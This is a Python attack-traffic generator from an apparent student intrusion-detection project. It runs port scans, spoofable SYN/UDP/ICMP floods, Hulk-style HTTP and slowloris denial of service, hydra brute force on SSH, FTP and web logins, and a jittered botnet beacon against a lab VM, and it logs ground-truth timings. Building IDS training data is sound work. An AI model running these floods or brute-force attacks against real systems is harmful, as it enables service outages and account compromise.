#!/usr/bin/env python3
"""
Master Attack Script for sdmay26 IDS project.
Generates attack traffic against a victim VM and writes a 'time fence' ground truth file
that Andrew's parser can use to label CICFlowMeter-extracted flows.

Ground truth format (one row per attack run):
    attack_id,attack_type,start_time,end_time,target_ip,src_ip_used,notes

Requires chrony syncing system clock against NTP server VM.
Install deps: sudo apt install nmap hydra hping3 slowhttptest python3-scapy python3-requests

Usage:
    sudo python3 attack.py <attack_type> --target <victim_ip> [options...]

Run `sudo python3 attack.py --help` to list attack types.
Run `sudo python3 attack.py <attack_type> --help` for per-attack options.
"""

import argparse, os, sys, time, random, subprocess, threading, socket
from scapy.all import IP, TCP, UDP, ICMP, Raw, send, sendp, Ether, RandIP, RandShort

GROUND_TRUTH_FILE = "attack_ground_truth.csv"
GROUND_TRUTH_HEADER = "attack_id,attack_type,start_time,end_time,target_ip,src_ip_used,notes\n"

def ensure_ground_truth_header():
    if not os.path.exists(GROUND_TRUTH_FILE) or os.path.getsize(GROUND_TRUTH_FILE) == 0:
        with open(GROUND_TRUTH_FILE, "w") as f: f.write(GROUND_TRUTH_HEADER)

def next_attack_id():
    ensure_ground_truth_header()
    with open(GROUND_TRUTH_FILE) as f: lines = f.readlines()
    return max(0, len(lines) - 1)  # subtract header

def log_fence(attack_type, start_time, end_time, target_ip, src_ip_used, notes):
    """Append one row to the ground truth fence file."""
    ensure_ground_truth_header()
    aid = next_attack_id()
    notes_clean = notes.replace(",", ";")  # avoid breaking CSV
    with open(GROUND_TRUTH_FILE, "a") as f:
        f.write(f"{aid},{attack_type},{start_time:.6f},{end_time:.6f},{target_ip},{src_ip_used},{notes_clean}\n")
    print(f"[+] Logged fence: id={aid} type={attack_type} duration={end_time - start_time:.2f}s")

def run_cmd(cmd, timeout=None):
    """Run an external command, return returncode. Streams stdout/stderr to console."""
    print(f"[*] $ {' '.join(cmd) if isinstance(cmd, list) else cmd}")
    try:
        return subprocess.run(cmd, timeout=timeout, shell=isinstance(cmd, str)).returncode
    except subprocess.TimeoutExpired:
        print(f"[!] Command timed out after {timeout}s (expected for time-bounded attacks)")
        return 0
    except FileNotFoundError as e:
        print(f"[-] Tool not found: {e}. Install it via apt.")
        return 1

# ============================================================================
# ATTACK IMPLEMENTATIONS
# ============================================================================

def attack_port_scan(args):
    """SYN port scan via nmap. NOT spoofed (needs return traffic)."""
    notes = f"nmap SYN scan ports {args.ports} timing T{args.timing}"
    start = time.time()
    run_cmd(["nmap", "-sS", "-p", args.ports, f"-T{args.timing}", "-Pn", args.target])
    end = time.time()
    log_fence("port_scan", start, end, args.target, "real", notes)

def attack_port_scan_udp(args):
    """UDP port scan via nmap. Slower but produces UDP flows."""
    notes = f"nmap UDP scan ports {args.ports}"
    start = time.time()
    run_cmd(["nmap", "-sU", "-p", args.ports, f"-T{args.timing}", "-Pn", args.target])
    end = time.time()
    log_fence("port_scan_udp", start, end, args.target, "real", notes)

def attack_ddos_syn(args):
    """TCP SYN flood. Default NON-spoofed (CIC-IDS-2017 style) so victim sends SYN-ACKs back,
    producing the bidirectional flow features the model expects (Bwd Packet Length Min, etc.).
    Spoofing is available via --spoof but produces flows the CIC-trained model won't recognize.
    """
    notes = f"hping3 SYN flood rate~{args.rate}pps duration={args.duration}s spoof={args.spoof}"
    start = time.time()
    cmd = ["hping3", "-S", "-p", str(args.port), "-i", f"u{int(1_000_000 / max(args.rate, 1))}", args.target]
    if args.spoof: cmd[1:1] = ["--rand-source"]
    run_cmd(cmd, timeout=args.duration)
    end = time.time()
    src = "spoofed" if args.spoof else "real"
    log_fence("ddos_syn", start, end, args.target, src, notes)

def attack_ddos_udp(args):
    """UDP flood. Default NON-spoofed so victim sends ICMP-unreachable replies (backward traffic)."""
    notes = f"hping3 UDP flood rate~{args.rate}pps duration={args.duration}s spoof={args.spoof}"
    start = time.time()
    cmd = ["hping3", "--udp", "-p", str(args.port), "-i", f"u{int(1_000_000 / max(args.rate, 1))}", args.target]
    if args.spoof: cmd[1:1] = ["--rand-source"]
    run_cmd(cmd, timeout=args.duration)
    end = time.time()
    src = "spoofed" if args.spoof else "real"
    log_fence("ddos_udp", start, end, args.target, src, notes)

def attack_ddos_icmp(args):
    """ICMP flood (ping flood). Default NON-spoofed so victim sends echo replies (backward traffic)."""
    notes = f"hping3 ICMP flood rate~{args.rate}pps duration={args.duration}s spoof={args.spoof}"
    start = time.time()
    cmd = ["hping3", "-1", "-i", f"u{int(1_000_000 / max(args.rate, 1))}", args.target]
    if args.spoof: cmd[1:1] = ["--rand-source"]
    run_cmd(cmd, timeout=args.duration)
    end = time.time()
    src = "spoofed" if args.spoof else "real"
    log_fence("ddos_icmp", start, end, args.target, src, notes)

def attack_dos_hulk(args):
    """HTTP DoS in the style of CIC-IDS-2017's 'DoS Hulk' attack.
    Many concurrent threads making real HTTP GETs with randomized URLs and User-Agents.
    Each request is a full TCP handshake + HTTP request + HTTP response, so flows have
    rich bidirectional features. This is the attack signature the model was actually trained on.
    """
    import urllib.request, urllib.parse, threading
    notes = f"hulk-style HTTP DoS threads={args.threads} duration={args.duration}s"
    start = time.time()
    end_target = start + args.duration
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Android 11; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0",
    ]
    referers = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", "https://www.reddit.com/", ""]
    counter = {"sent": 0, "errors": 0}
    lock = threading.Lock()
    stop = threading.Event()

    def worker():
        while not stop.is_set() and time.time() < end_target:
            # Random query string to defeat caching
            qs = urllib.parse.urlencode({f"k{random.randint(0,9999)}": random.randint(0, 99999) for _ in range(random.randint(1, 4))})
            url = f"http://{args.target}/?{qs}"
            req = urllib.request.Request(url, headers={
                "User-Agent": random.choice(user_agents),
                "Referer": random.choice(referers),
                "Cache-Control": "no-cache",
                "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
                "Connection": random.choice(["keep-alive", "close"]),
            })
            try:
                with urllib.request.urlopen(req, timeout=3) as r: r.read(2048)
                with lock: counter["sent"] += 1
            except Exception:
                with lock: counter["errors"] += 1

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(args.threads)]
    for t in threads: t.start()
    while time.time() < end_target: time.sleep(0.5)
    stop.set()
    for t in threads: t.join(timeout=2)
    end = time.time()
    log_fence("dos_hulk", start, end, args.target, "real", notes + f" sent={counter['sent']} errors={counter['errors']}")

def attack_dos_slowloris(args):
    """Slow HTTP DoS. Targets apache2 on victim. Low-volume, long-duration flows."""
    notes = f"slowhttptest slowloris duration={args.duration}s connections={args.connections}"
    start = time.time()
    # -H = slowloris mode (slow headers), -c connections, -l duration, -u url
    cmd = ["slowhttptest", "-H", "-c", str(args.connections), "-l", str(args.duration), "-u", f"http://{args.target}/"]
    run_cmd(cmd, timeout=args.duration + 10)
    end = time.time()
    log_fence("dos_slowloris", start, end, args.target, "real", notes)

def attack_ssh_brute(args):
    """SSH brute force via hydra. NOT spoofed."""
    notes = f"hydra ssh users={args.userlist} passlist={args.passlist} tasks={args.tasks}"
    start = time.time()
    cmd = ["hydra", "-L", args.userlist, "-P", args.passlist, "-t", str(args.tasks), "-f", f"ssh://{args.target}"]
    run_cmd(cmd, timeout=args.duration if args.duration > 0 else None)
    end = time.time()
    log_fence("ssh_brute", start, end, args.target, "real", notes)

def attack_ftp_brute(args):
    """FTP brute force via hydra. NOT spoofed. Requires vsftpd or similar on victim."""
    notes = f"hydra ftp users={args.userlist} passlist={args.passlist} tasks={args.tasks}"
    start = time.time()
    cmd = ["hydra", "-L", args.userlist, "-P", args.passlist, "-t", str(args.tasks), "-f", f"ftp://{args.target}"]
    run_cmd(cmd, timeout=args.duration if args.duration > 0 else None)
    end = time.time()
    log_fence("ftp_brute", start, end, args.target, "real", notes)

def attack_web_brute(args):
    """HTTP form brute force via hydra against apache2 on victim."""
    notes = f"hydra http-post-form path={args.path} tasks={args.tasks}"
    start = time.time()
    form_spec = f"{args.path}:{args.user_field}=^USER^&{args.pass_field}=^PASS^:{args.failure_string}"
    cmd = ["hydra", "-L", args.userlist, "-P", args.passlist, "-t", str(args.tasks), args.target, "http-post-form", form_spec]
    run_cmd(cmd, timeout=args.duration if args.duration > 0 else None)
    end = time.time()
    log_fence("web_brute", start, end, args.target, "real", notes)

def attack_botnet_beacon(args):
    """Simulated C2 heartbeat using REAL TCP connections (CIC-IDS-2017 'Bot' style).
    Each beacon does a real connect() to victim:port, sends a small payload, reads any response,
    and closes. This produces bidirectional flow features (handshake + data + RST/FIN) which is
    what the model expects from the Ares botnet samples in CIC-IDS-2017.

    If nothing listens on the target port, the victim sends RST in response to the SYN -- still
    backward traffic, just shorter. To get richer flows, run a netcat listener on the victim:
        sudo nc -lk 4444 > /dev/null
    """
    notes = f"botnet beacon (real TCP) port={args.port} interval={args.interval}s duration={args.duration}s"
    start = time.time()
    end_target = start + args.duration
    sent = ok = errors = 0
    while time.time() < end_target:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((args.target, args.port))
            payload = f"BEACON|seq={sent}|ts={time.time():.3f}|status=alive\n".encode()
            s.sendall(payload)
            try: s.recv(1024)  # try to read response if any
            except socket.timeout: pass
            s.close()
            ok += 1
        except (ConnectionRefusedError, socket.timeout, OSError):
            errors += 1  # RST from victim still counts as a flow with backward traffic
        sent += 1
        # Sleep with jitter so it isn't a perfect interval (more realistic, harder to detect)
        time.sleep(args.interval + random.uniform(-args.jitter, args.jitter))
    end = time.time()
    log_fence("botnet_beacon", start, end, args.target, "real", notes + f" sent={sent} ok={ok} errors={errors}")

def attack_benign(args):
    """Generate benign-looking traffic: HTTP GETs, DNS lookups, occasional pings.
    Critical class for training/eval - the model needs benign flows to compare against.
    NOT spoofed.
    """
    import urllib.request
    notes = f"benign mixed traffic duration={args.duration}s"
    start = time.time()
    end_target = start + args.duration
    paths = ["/", "/index.html", "/icons/ubuntu-logo.png", "/manual/", "/server-status"]
    actions_done = {"http": 0, "ping": 0, "dns": 0}
    while time.time() < end_target:
        choice = random.choices(["http", "ping", "dns"], weights=[7, 2, 1])[0]
        try:
            if choice == "http":
                path = random.choice(paths)
                url = f"http://{args.target}{path}"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (benign-traffic-gen)"})
                try: urllib.request.urlopen(req, timeout=3).read(1024)
                except Exception: pass  # 404s, etc., are fine - still generates a flow
                actions_done["http"] += 1
            elif choice == "ping":
                run_cmd(["ping", "-c", "1", "-W", "1", args.target], timeout=2)
                actions_done["ping"] += 1
            else:
                # DNS lookup against the victim if it runs a resolver, else just generate a UDP/53 flow
                try: socket.gethostbyname_ex(args.target)
                except Exception: pass
                # Also send a raw DNS query packet to victim:53 to guarantee a flow
                pkt = IP(dst=args.target) / UDP(dport=53, sport=random.randint(1024, 65535)) / Raw(load=b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01")
                try: send(pkt, verbose=False)
                except Exception: pass
                actions_done["dns"] += 1
        except Exception as e:
            print(f"[-] benign action error: {e}")
        time.sleep(random.uniform(0.5, 2.5))
    end = time.time()
    log_fence("benign", start, end, args.target, "real", notes + f" actions={actions_done}")

# ============================================================================
# CLI
# ============================================================================

def build_parser():
    p = argparse.ArgumentParser(description="Master attack script - sdmay26 IDS project")
    sub = p.add_subparsers(dest="attack", required=True, help="attack type")

    def add_target(sp): sp.add_argument("--target", required=True, help="victim IP")

    sp = sub.add_parser("port_scan", help="nmap SYN scan"); add_target(sp)
    sp.add_argument("--ports", default="1-1024"); sp.add_argument("--timing", type=int, default=4)
    sp.set_defaults(func=attack_port_scan)

    sp = sub.add_parser("port_scan_udp", help="nmap UDP scan"); add_target(sp)
    sp.add_argument("--ports", default="1-1024"); sp.add_argument("--timing", type=int, default=4)
    sp.set_defaults(func=attack_port_scan_udp)

    sp = sub.add_parser("ddos_syn", help="TCP SYN flood (hping3, non-spoofed by default)"); add_target(sp)
    sp.add_argument("--port", type=int, default=80); sp.add_argument("--rate", type=int, default=1000, help="packets/sec")
    sp.add_argument("--duration", type=int, default=30); sp.add_argument("--spoof", action="store_true", default=False)
    sp.add_argument("--no-spoof", dest="spoof", action="store_false")
    sp.set_defaults(func=attack_ddos_syn)

    sp = sub.add_parser("ddos_udp", help="UDP flood (hping3, non-spoofed by default)"); add_target(sp)
    sp.add_argument("--port", type=int, default=53); sp.add_argument("--rate", type=int, default=1000)
    sp.add_argument("--duration", type=int, default=30); sp.add_argument("--spoof", action="store_true", default=False)
    sp.add_argument("--no-spoof", dest="spoof", action="store_false")
    sp.set_defaults(func=attack_ddos_udp)

    sp = sub.add_parser("ddos_icmp", help="ICMP flood (hping3, non-spoofed by default)"); add_target(sp)
    sp.add_argument("--rate", type=int, default=1000); sp.add_argument("--duration", type=int, default=30)
    sp.add_argument("--spoof", action="store_true", default=False); sp.add_argument("--no-spoof", dest="spoof", action="store_false")
    sp.set_defaults(func=attack_ddos_icmp)

    sp = sub.add_parser("dos_hulk", help="HTTP DoS like CIC-IDS-2017 'DoS Hulk' (real HTTP requests)"); add_target(sp)
    sp.add_argument("--threads", type=int, default=50, help="concurrent attacker threads")
    sp.add_argument("--duration", type=int, default=30)
    sp.set_defaults(func=attack_dos_hulk)

    sp = sub.add_parser("dos_slowloris", help="Slow HTTP DoS via slowhttptest"); add_target(sp)
    sp.add_argument("--connections", type=int, default=200); sp.add_argument("--duration", type=int, default=60)
    sp.set_defaults(func=attack_dos_slowloris)

    sp = sub.add_parser("ssh_brute", help="SSH brute force via hydra"); add_target(sp)
    sp.add_argument("--userlist", required=True); sp.add_argument("--passlist", required=True)
    sp.add_argument("--tasks", type=int, default=4); sp.add_argument("--duration", type=int, default=0, help="0=unlimited")
    sp.set_defaults(func=attack_ssh_brute)

    sp = sub.add_parser("ftp_brute", help="FTP brute force via hydra"); add_target(sp)
    sp.add_argument("--userlist", required=True); sp.add_argument("--passlist", required=True)
    sp.add_argument("--tasks", type=int, default=4); sp.add_argument("--duration", type=int, default=0)
    sp.set_defaults(func=attack_ftp_brute)

    sp = sub.add_parser("web_brute", help="HTTP form brute force via hydra"); add_target(sp)
    sp.add_argument("--userlist", required=True); sp.add_argument("--passlist", required=True)
    sp.add_argument("--path", default="/login.php"); sp.add_argument("--user_field", default="username")
    sp.add_argument("--pass_field", default="password"); sp.add_argument("--failure_string", default="F=incorrect")
    sp.add_argument("--tasks", type=int, default=4); sp.add_argument("--duration", type=int, default=0)
    sp.set_defaults(func=attack_web_brute)

    sp = sub.add_parser("botnet_beacon", help="C2 heartbeat using real TCP connections"); add_target(sp)
    sp.add_argument("--port", type=int, default=8080, help="port to beacon to (use a port the victim has listening for richer flows)")
    sp.add_argument("--interval", type=float, default=5.0); sp.add_argument("--duration", type=int, default=300)
    sp.add_argument("--jitter", type=float, default=0.5, help="random +/- seconds added to interval")
    sp.set_defaults(func=attack_botnet_beacon)

    sp = sub.add_parser("benign", help="Generate benign mixed traffic"); add_target(sp)
    sp.add_argument("--duration", type=int, default=120)
    sp.set_defaults(func=attack_benign)

    return p

def main():
    if os.geteuid() != 0:
        print("[-] Must run with sudo (raw sockets / hping3 / nmap SYN scan need root)"); sys.exit(1)
    args = build_parser().parse_args()
    print(f"[*] Running attack: {args.attack} -> {args.target}")
    print(f"[*] Ground truth: {GROUND_TRUTH_FILE}\n")
    args.func(args)
    print(f"\n[+] Done. Fence appended to {GROUND_TRUTH_FILE}")

if __name__ == "__main__":
    main()
